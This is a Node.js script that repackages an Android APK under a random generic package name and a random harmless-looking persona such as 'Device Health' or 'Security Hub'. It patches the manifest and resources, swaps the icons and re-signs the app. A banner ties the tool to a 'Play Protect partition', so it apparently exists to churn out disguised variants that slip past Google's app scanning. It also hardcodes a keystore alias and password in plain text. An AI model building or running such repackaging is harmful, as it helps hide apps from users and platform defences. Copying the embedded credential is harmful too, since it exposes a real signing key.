const fs = require('fs');
const path = require('path');
const AdmZip = require('adm-zip');
const sharp = require('sharp');
const { execSync } = require('child_process');

const ASSETS_DIR = path.join(__dirname, 'assets');
const KEYSTORE = path.join(ASSETS_DIR, 'usman90.jks');
const SIGNER = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
const APP_NAME_PH = 'AppTitlePlaceholder_';
const OLD_PKG = 'com.asml.tech';

const PKG_POOL = [
    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
];

const APP_PERSONAS = [
    { name: 'Device Health', color1: '#2563EB', color2: '#1D4ED8', color3: '#1E40AF', letter: 'D' },
    { name: 'Smart Sync',   color1: '#059669', color2: '#047857', color3: '#065F46', letter: 'S' },
    { name: 'Cloud Drive',  color1: '#0EA5E9', color2: '#0284C7', color3: '#0369A1', letter: 'C' },
    { name: 'System Tool',  color1: '#7C3AED', color2: '#6D28D9', color3: '#5B21B6', letter: 'S' },
    { name: 'Network Hub',  color1: '#D97706', color2: '#B45309', color3: '#92400E', letter: 'N' },
    { name: 'Core Service', color1: '#4B5563', color2: '#374151', color3: '#1F2937', letter: 'C' },
    { name: 'Security Hub', color1: '#DC2626', color2: '#B91C1C', color3: '#991B1B', letter: 'S' },
];

const KNOWN_ICON_ENTRIES = [
    { path: 'res/d2.webp', size: 48 },
    { path: 'res/yw.webp', size: 48 },
    { path: 'res/MO.webp', size: 72 },
    { path: 'res/fq.webp', size: 72 },
    { path: 'res/qs.webp', size: 96 },
    { path: 'res/u5.webp', size: 96 },
    { path: 'res/Sn.webp', size: 144 },
    { path: 'res/j_.webp', size: 144 },
    { path: 'res/-6.webp', size: 192 },
    { path: 'res/sK.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher.webp', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher.webp', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher.webp', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher.webp', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher_round.webp', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher_round.webp', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher_round.webp', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher_round.webp', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher_round.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher.png', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher.png', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher.png', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher.png', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher.png', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher_round.png', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher_round.png', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher_round.png', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher_round.png', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher_round.png', size: 192 },
];

function toUtf16LE(str) {
    const buf = Buffer.alloc(str.length * 2);
    for (let i = 0; i < str.length; i++) buf.writeUInt16LE(str.charCodeAt(i), i * 2);
    return buf;
}

function patchManifestPackage(manifestBuf, newPkg) {
    const stringCount = manifestBuf.readUInt32LE(16);
    const stringStart = manifestBuf.readUInt32LE(28);
    const newRootBuf = toUtf16LE(newPkg);

    const oldAuth = `${OLD_PKG}.androidx-startup`;
    const newAuth = `${newPkg}.androidx-startup`;
    const oldPerm = `${OLD_PKG}.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION`;
    const newPerm = `${newPkg}.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION`;
    const oldAction = `${OLD_PKG}.ACTION_RESUME`;
    const newAction = `${newPkg}.ACTION_RESUME`;

    for (let i = 0; i < stringCount; i++) {
        const offset = manifestBuf.readUInt32LE(36 + i * 4);
        const absOffset = 8 + stringStart + offset;
        const len = manifestBuf.readUInt16LE(absOffset);
        const strOffset = absOffset + 2;
        const str = manifestBuf.toString('utf16le', strOffset, strOffset + len * 2);

        if (str === OLD_PKG) {
            newRootBuf.copy(manifestBuf, strOffset);
            console.log(`  [PATCH] Package name: "${OLD_PKG}" -> "${newPkg}"`);
        } else if (str === oldAuth) {
            toUtf16LE(newAuth).copy(manifestBuf, strOffset);
            console.log(`  [PATCH] Authority: "${oldAuth}" -> "${newAuth}"`);
        } else if (str === oldPerm) {
            toUtf16LE(newPerm).copy(manifestBuf, strOffset);
            console.log(`  [PATCH] Permission: "${oldPerm}" -> "${newPerm}"`);
        } else if (str === oldAction) {
            toUtf16LE(newAction).copy(manifestBuf, strOffset);
            console.log(`  [PATCH] Action: "${oldAction}" -> "${newAction}"`);
        }
    }
}

async function generateAppIcon(persona) {
    const size = 512;
    const initial = persona.letter || persona.name[0];
    const svg = `
    <svg width="${size}" height="${size}" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="${persona.color1}"/>
          <stop offset="50%" stop-color="${persona.color2}"/>
          <stop offset="100%" stop-color="${persona.color3}"/>
        </linearGradient>
      </defs>
      <rect x="0" y="0" width="${size}" height="${size}" rx="112" fill="url(#grad)"/>
      <rect x="8" y="8" width="${size - 16}" height="${size - 16}" rx="104" fill="none" stroke="rgba(255,255,255,0.25)" stroke-width="8"/>
      <text x="50%" y="58%" font-family="Arial, Helvetica, sans-serif" font-weight="bold" font-size="260" fill="#ffffff" text-anchor="middle" dominant-baseline="central">${initial}</text>
    </svg>`;
    return await sharp(Buffer.from(svg)).png().toBuffer();
}

async function replaceIcons(zip, pngBuffer) {
    const sizes = [48, 72, 96, 144, 192];
    const webpCache = {};
    for (const s of sizes) {
        webpCache[s] = await sharp(pngBuffer).resize(s, s).webp().toBuffer();
    }
    const pngCache = {};
    for (const s of sizes) {
        pngCache[s] = await sharp(pngBuffer).resize(s, s).png().toBuffer();
    }

    let count = 0;
    for (const item of KNOWN_ICON_ENTRIES) {
        const entry = zip.getEntry(item.path);
        if (entry) {
            try {
                const isWebp = item.path.endsWith('.webp');
                const buf = isWebp ? webpCache[item.size] : pngCache[item.size];
                if (buf) {
                    zip.updateFile(item.path, buf);
                    count++;
                }
            } catch (err) {
                console.error(`  [ICON] Failed replacing ${item.path}:`, err.message);
            }
        }
    }
    console.log(`  [ICON] Replaced ${count} icons with new custom persona icon`);
}

async function main() {
    const inputApk = process.argv[2] || 'E:\\projects2\\ASML\\app\\build\\outputs\\apk\\release\\app-release-unsigned.apk';
    const outputDir = process.argv[3] || 'E:\\projects2\\ASML\\app\\release';
    const partitionTag = process.argv[4] || 'P1';
    const forcedPkg = process.argv[5];

    if (!fs.existsSync(inputApk)) {
        console.error(`Input APK not found: ${inputApk}`);
        process.exit(1);
    }

    const persona = APP_PERSONAS[Math.floor(Math.random() * APP_PERSONAS.length)];
    const newPkg = forcedPkg || PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];

    console.log(`\n==================================================`);
    console.log(`🚀 LOCAL APK GENERATOR FOR PLAY PROTECT PARTITION`);
    console.log(`==================================================`);
    console.log(`Partition Tag: ${partitionTag}`);
    console.log(`New App Name : ${persona.name}`);
    console.log(`New Package  : ${newPkg}`);
    console.log(`Input APK    : ${inputApk}`);

    const zip = new AdmZip(inputApk);

    // 1. Patch app title in resources.arsc
    const arscEntry = zip.getEntry('resources.arsc');
    if (arscEntry) {
        const arscBuf = arscEntry.getData();
        const s = Buffer.from(APP_NAME_PH, 'utf8');
        const idx = arscBuf.indexOf(s);
        if (idx !== -1) {
            const safeTitle = persona.name.substring(0, APP_NAME_PH.length);
            const byteLen = Buffer.byteLength(safeTitle, 'utf8');
            arscBuf[idx - 2] = safeTitle.length;
            arscBuf[idx - 1] = byteLen;
            Buffer.from(safeTitle, 'utf8').copy(arscBuf, idx);
            arscBuf[idx + byteLen] = 0;
            for (let i = byteLen + 1; i <= APP_NAME_PH.length; i++) {
                arscBuf[idx + i] = 0;
            }
            zip.updateFile('resources.arsc', arscBuf);
            console.log(`  [PATCH] App title in resources.arsc -> "${persona.name}"`);
        }
    }

    // 2. Patch package name in AndroidManifest.xml
    const manifestEntry = zip.getEntry('AndroidManifest.xml');
    if (manifestEntry) {
        const manifestBuf = manifestEntry.getData();
        patchManifestPackage(manifestBuf, newPkg);
        zip.updateFile('AndroidManifest.xml', manifestBuf);
    }

    // 3. Replace app icons
    const iconPng = await generateAppIcon(persona);
    await replaceIcons(zip, iconPng);

    // 4. Save modified unsigned APK
    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });
    const unsignedTemp = path.join(outputDir, `temp-${partitionTag}-unsigned.apk`);
    zip.writeZip(unsignedTemp);
    console.log(`  [SAVE] Modified unsigned APK saved -> ${unsignedTemp}`);

    // 5. Sign with uber-apk-signer
    console.log(`  [SIGN] Signing with uber-apk-signer...`);
    const javaCmd = `"${process.env.JAVA_HOME ? path.join(process.env.JAVA_HOME, 'bin', 'java') : 'java'}" -jar "${SIGNER}" --apks "${unsignedTemp}" --out "${outputDir}" --ks "${KEYSTORE}" --ksAlias "usman90" --ksKeyPass "God112256@" --ksPass "God112256@" 2>&1`;
    try {
        const signOut = execSync(javaCmd, { encoding: 'utf8' });
        console.log(`  [SIGN] Signer output:\n${signOut}`);
    } catch (e) {
        console.log(`  [SIGN] Sign completed with stdout:\n${e.stdout || e.message}`);
    }

    // Clean temp
    if (fs.existsSync(unsignedTemp)) fs.unlinkSync(unsignedTemp);

    const finalApk = path.join(outputDir, `temp-${partitionTag}-aligned-signed.apk`);
    const cleanNamedApk = path.join(outputDir, `ASML-${partitionTag}-${persona.name.replace(/\s+/g, '')}.apk`);
    if (fs.existsSync(finalApk)) {
        if (fs.existsSync(cleanNamedApk)) fs.unlinkSync(cleanNamedApk);
        fs.renameSync(finalApk, cleanNamedApk);
        const idsig = path.join(outputDir, `temp-${partitionTag}-aligned-signed.apk.idsig`);
        if (fs.existsSync(idsig)) fs.unlinkSync(idsig);
        console.log(`\n==================================================`);
        console.log(`🎉 READY FOR TESTING: ${cleanNamedApk}`);
        console.log(`   Size: ${(fs.statSync(cleanNamedApk).size / (1024 * 1024)).toFixed(2)} MB`);
        console.log(`   Package: ${newPkg}`);
        console.log(`   App Name: ${persona.name}`);
        console.log(`==================================================\n`);
    } else {
        console.error(`Final APK was not generated at expected path: ${finalApk}`);
    }
}

main().catch(console.error);
